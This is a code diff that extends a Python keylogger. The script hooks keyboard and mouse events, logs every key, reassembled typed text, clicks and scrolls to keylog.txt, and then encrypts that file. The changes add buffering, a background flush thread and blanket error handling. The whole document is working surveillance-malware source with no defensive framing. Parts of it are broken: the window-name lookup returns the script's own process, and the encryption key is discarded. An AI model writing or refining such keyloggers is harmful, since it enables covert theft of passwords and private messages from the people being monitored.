@@ -4,6 +4,8 @@ from pynput import keyboard, mouse
 import logging
 import time
 from cryptography.fernet import Fernet
+from collections import deque
+import threading
 
 # Generate a key for encryption
 key = Fernet.generate_key()
@@ -13,78 +15,146 @@ cipher_suite = Fernet(key)
 logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def get_active_window_process_name():
-    active_window = psutil.Process(os.getpid())
-    return active_window.name()
+    try:
+        active_window = psutil.Process(os.getpid())
+        return active_window.name()
+    except Exception as e:
+        logging.error(f"Error getting active window process name: {e}")
+        return "Unknown"
 
-# Initialize a variable to store the current text input
-current_text = []
+# Initialize a deque to store the current text input
+current_text = deque()
+log_buffer = deque()
+active_window_name = get_active_window_process_name()
+
+def log_event(message):
+    log_buffer.append(message)
+    if len(log_buffer) >= 10:  # Adjust the buffer size as needed
+        flush_log_buffer()
+
+def flush_log_buffer():
+    with open("keylog.txt", "a") as log_file:
+        while log_buffer:
+            log_file.write(log_buffer.popleft() + "\n")
 
 def on_press(key):
+    global active_window_name
     try:
-        app_name = get_active_window_process_name()
-        logging.info(f"Key pressed: {key.char} in {app_name}")
+        new_window_name = get_active_window_process_name()
+        if new_window_name != active_window_name:
+            active_window_name = new_window_name
+        log_event(f"Key pressed: {key.char} in {active_window_name}")
     except AttributeError:
-        logging.info(f"Special key pressed: {key} in {app_name}")
+        log_event(f"Special key pressed: {key} in {active_window_name}")
+    except Exception as e:
+        logging.error(f"Error in on_press: {e}")
 
 def on_release(key):
-    global current_text
-    app_name = get_active_window_process_name()
-    if hasattr(key, 'char') and key.char is not None:
-        current_text.append(key.char)
-    elif key == keyboard.Key.space:
-        current_text.append(' ')
-    elif key == keyboard.Key.enter:
-        current_text.append('\n')
+    global current_text, active_window_name
+    try:
+        new_window_name = get_active_window_process_name()
+        if new_window_name != active_window_name:
+            active_window_name = new_window_name
+        if hasattr(key, 'char') and key.char is not None:
+            current_text.append(key.char)
+        elif key == keyboard.Key.space:
+            current_text.append(' ')
+        elif key == keyboard.Key.enter:
+            current_text.append('\n')
 
-    if key == keyboard.Key.space or key == keyboard.Key.enter:
-        logging.info(f"Text input: {''.join(current_text)} in {app_name}")
-        current_text = []
+        if key == keyboard.Key.space or key == keyboard.Key.enter:
+            log_event(f"Text input: {''.join(current_text)} in {active_window_name}")
+            current_text.clear()
 
-    logging.info(f"Key released: {key} in {app_name}")
-    if key == keyboard.Key.esc:
-        return False
+        log_event(f"Key released: {key} in {active_window_name}")
+        if key == keyboard.Key.esc:
+            return False
+    except Exception as e:
+        logging.error(f"Error in on_release: {e}")
 
 def on_click(x, y, button, pressed):
-    app_name = get_active_window_process_name()
-    if pressed:
-        logging.info(f"Mouse clicked at ({x}, {y}) with {button} in {app_name}")
-    else:
-        logging.info(f"Mouse released at ({x}, {y}) with {button} in {app_name}")
+    global active_window_name
+    try:
+        new_window_name = get_active_window_process_name()
+        if new_window_name != active_window_name:
+            active_window_name = new_window_name
+        if pressed:
+            log_event(f"Mouse clicked at ({x}, {y}) with {button} in {active_window_name}")
+        else:
+            log_event(f"Mouse released at ({x}, {y}) with {button} in {active_window_name}")
+    except Exception as e:
+        logging.error(f"Error in on_click: {e}")
 
 def on_scroll(x, y, dx, dy):
-    app_name = get_active_window_process_name()
-    logging.info(f"Mouse scrolled at ({x}, {y}) with delta ({dx}, {dy}) in {app_name}")
+    global active_window_name
+    try:
+        new_window_name = get_active_window_process_name()
+        if new_window_name != active_window_name:
+            active_window_name = new_window_name
+        log_event(f"Mouse scrolled at ({x}, {y}) with delta ({dx}, {dy}) in {active_window_name}")
+    except Exception as e:
+        logging.error(f"Error in on_scroll: {e}")
 
 def stop_listeners():
-    keyboard_listener.stop()
-    mouse_listener.stop()
+    try:
+        keyboard_listener.stop()
+        mouse_listener.stop()
+    except Exception as e:
+        logging.error(f"Error stopping listeners: {e}")
 
 def on_key_combination(key):
-    if key == keyboard.KeyCode.from_char('\x03'):  # Ctrl + C
-        stop_listeners()
-        return False
+    try:
+        if key == keyboard.KeyCode.from_char('\x03'):  # Ctrl + C
+            stop_listeners()
+            return False
+    except Exception as e:
+        logging.error(f"Error in on_key_combination: {e}")
+
+def periodic_flush():
+    while True:
+        time.sleep(10)  # Adjust the interval as needed
+        flush_log_buffer()
 
 # Set up the keyboard listener
-keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
-keyboard_listener.start()
+try:
+    keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+    keyboard_listener.start()
+except Exception as e:
+    logging.error(f"Error setting up keyboard listener: {e}")
 
 # Set up the mouse listener
-mouse_listener = mouse.Listener(on_click=on_click, on_scroll=on_scroll)
-mouse_listener.start()
+try:
+    mouse_listener = mouse.Listener(on_click=on_click, on_scroll=on_scroll)
+    mouse_listener.start()
+except Exception as e:
+    logging.error(f"Error setting up mouse listener: {e}")
 
 # Set up the key combination listener
-key_combination_listener = keyboard.Listener(on_press=on_key_combination)
-key_combination_listener.start()
+try:
+    key_combination_listener = keyboard.Listener(on_press=on_key_combination)
+    key_combination_listener.start()
+except Exception as e:
+    logging.error(f"Error setting up key combination listener: {e}")
 
-keyboard_listener.join()
-mouse_listener.join()
-key_combination_listener.join()
+# Start the periodic flush thread
+flush_thread = threading.Thread(target=periodic_flush, daemon=True)
+flush_thread.start()
+
+try:
+    keyboard_listener.join()
+    mouse_listener.join()
+    key_combination_listener.join()
+except Exception as e:
+    logging.error(f"Error joining listeners: {e}")
 
 # Encrypt the log file
-with open("keylog.txt", "rb") as file:
-    log_data = file.read()
+try:
+    with open("keylog.txt", "rb") as file:
+        log_data = file.read()
 
-encrypted_data = cipher_suite.encrypt(log_data)
+    encrypted_data = cipher_suite.encrypt(log_data)
 
-with open("keylog.enc", "wb") as file:
-    file.write(encrypted_data)
+    with open("keylog.enc", "wb") as file:
+        file.write(encrypted_data)
+except Exception as e:
+    logging.error(f"Error encrypting log file: {e}")
